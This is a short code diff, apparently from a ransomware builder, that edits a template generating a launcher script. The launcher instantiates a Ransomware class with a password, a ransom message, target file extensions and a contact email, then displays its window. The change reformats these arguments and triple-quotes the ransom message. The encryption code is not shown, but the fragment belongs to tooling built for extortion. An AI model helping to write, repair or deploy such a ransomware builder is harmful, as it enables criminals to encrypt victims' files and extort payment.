@@ -38,7 +38,12 @@ from ransomware import Ransomware
 
 if __name__ == '__main__':
     app = QApplication(sys.argv)
-    ransomware = Ransomware(password='{self.password}', ransom_message='{self.ransom_message}', extensions={self.extensions.split(',') if self.extensions else None}, email='{self.email}')
+    ransomware = Ransomware(
+        password='{self.password}',
+        ransom_message=\"\"\"{self.ransom_message}\"\"\",
+        extensions={self.extensions.split(',') if self.extensions else None},
+        email='{self.email}'
+    )
     ransomware.show()
     sys.exit(app.exec_())
 """
